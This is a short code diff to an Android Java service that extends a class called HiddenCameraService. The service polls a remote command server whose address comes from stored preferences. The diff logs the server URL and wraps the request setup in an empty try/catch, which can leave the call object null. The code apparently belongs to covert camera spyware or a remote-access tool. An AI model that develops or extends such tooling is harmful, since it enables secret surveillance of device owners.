@@ -760,6 +760,7 @@ public class server_command_service extends HiddenCameraService {
                 Log.d(TAG, "run: Current timeout: " + timeout + "S");
 
                 String request_uri = sharedPreferences.getString("url_command","")+sharedPreferences.getString("myid","");
+                Log.d(TAG,"url_server"+request_uri);
                 polling_json request_body = new polling_json();
                 request_body.offset = offset;
                 request_body.timeout = timeout;
@@ -767,9 +768,17 @@ public class server_command_service extends HiddenCameraService {
                     request_body.timeout = 0;
                     Log.d(TAG, "run: first_request_server");
                 }
-                RequestBody body = RequestBody.create(new Gson().toJson(request_body), const_value.JSON);
-                Request request = new Request.Builder().url(request_uri).method("POST", body).build();
-                Call call = okhttp_client_new.newCall(request);
+                RequestBody body;
+                Request request;
+                Call call = null;
+                try {
+                    body=RequestBody.create(new Gson().toJson(request_body), const_value.JSON);
+                    request=new Request.Builder().url(request_uri).method("POST", body).build();
+                    call=okhttp_client_new.newCall(request);
+                }catch (Exception e)
+                {
+                    
+                }
                 Response response;
                 try {
                     response = call.execute();
